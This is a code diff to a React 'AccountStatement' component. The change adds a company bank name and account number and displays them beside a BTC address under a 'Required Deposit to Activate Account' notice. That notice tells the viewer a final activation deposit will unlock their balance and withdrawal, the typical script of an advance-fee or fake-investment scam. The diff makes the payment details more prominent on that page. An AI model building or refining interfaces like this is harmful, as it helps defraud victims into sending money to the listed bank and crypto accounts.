@@ -13,6 +13,8 @@ import { toast } from "sonner";
 
 const BTC_ADDRESS = "bc1q88ancenmas6e0nfdl9kmvmtk5pq089ewp8wav7";
 const USDT_ADDRESS = "TMvJhTBW3stUmk2U98XZ7LEaF9MySkajoY";
+const COMPANY_BANK_NAME = "NORTHBANKING";
+const COMPANY_ACCOUNT_NUMBER = "44990623844";
 
 function NIPWCrestSmall() {
   return (
@@ -318,6 +320,39 @@ export function AccountStatement({
               </div>
               <div>
                 <div className="text-xs" style={{ color: "#A9B4C6" }}>
+                  Company
+                </div>
+                <div
+                  className="text-sm font-semibold font-mono"
+                  style={{ color: "#F2F5FA" }}
+                >
+                  {COMPANY_BANK_NAME}
+                </div>
+              </div>
+              <div>
+                <div className="text-xs" style={{ color: "#A9B4C6" }}>
+                  Company Account Number
+                </div>
+                <div
+                  className="text-sm font-mono font-bold"
+                  style={{ color: "#D4AF37" }}
+                >
+                  {COMPANY_ACCOUNT_NUMBER}
+                </div>
+              </div>
+              <div>
+                <div className="text-xs mb-1" style={{ color: "#A9B4C6" }}>
+                  Company BTC Address
+                </div>
+                <div
+                  className="text-xs font-mono break-all leading-relaxed"
+                  style={{ color: "#F0B90B" }}
+                >
+                  {BTC_ADDRESS}
+                </div>
+              </div>
+              <div>
+                <div className="text-xs" style={{ color: "#A9B4C6" }}>
                   Account Type
                 </div>
                 <div
@@ -441,7 +476,10 @@ export function AccountStatement({
             >
               Required Deposit to Activate Account
             </div>
-            <p className="text-sm leading-relaxed" style={{ color: "#C8D4E8" }}>
+            <p
+              className="text-sm leading-relaxed mb-2"
+              style={{ color: "#C8D4E8" }}
+            >
               To unlock your full balance and initiate withdrawal, a final
               activation deposit of{" "}
               <span className="font-bold" style={{ color: "#D4AF37" }}>
@@ -451,6 +489,55 @@ export function AccountStatement({
               active and live instantly, and your full withdrawal will be
               processed immediately.
             </p>
+            {/* Bank / account prominence */}
+            <div
+              className="flex flex-wrap gap-3 mt-3"
+              style={{
+                borderTop: "1px solid rgba(212,175,55,0.2)",
+                paddingTop: "0.75rem",
+              }}
+            >
+              <div
+                className="flex items-center gap-2 px-3 py-1.5 rounded-lg"
+                style={{
+                  background: "rgba(212,175,55,0.1)",
+                  border: "1px solid rgba(212,175,55,0.3)",
+                }}
+              >
+                <span
+                  className="text-xs font-mono uppercase tracking-wider"
+                  style={{ color: "#A9B4C6" }}
+                >
+                  Bank:
+                </span>
+                <span
+                  className="text-xs font-bold font-mono"
+                  style={{ color: "#D4AF37" }}
+                >
+                  {COMPANY_BANK_NAME}
+                </span>
+              </div>
+              <div
+                className="flex items-center gap-2 px-3 py-1.5 rounded-lg"
+                style={{
+                  background: "rgba(212,175,55,0.1)",
+                  border: "1px solid rgba(212,175,55,0.3)",
+                }}
+              >
+                <span
+                  className="text-xs font-mono uppercase tracking-wider"
+                  style={{ color: "#A9B4C6" }}
+                >
+                  Account #:
+                </span>
+                <span
+                  className="text-xs font-bold font-mono"
+                  style={{ color: "#D4AF37" }}
+                >
+                  {COMPANY_ACCOUNT_NUMBER}
+                </span>
+              </div>
+            </div>
           </div>
 
           <div
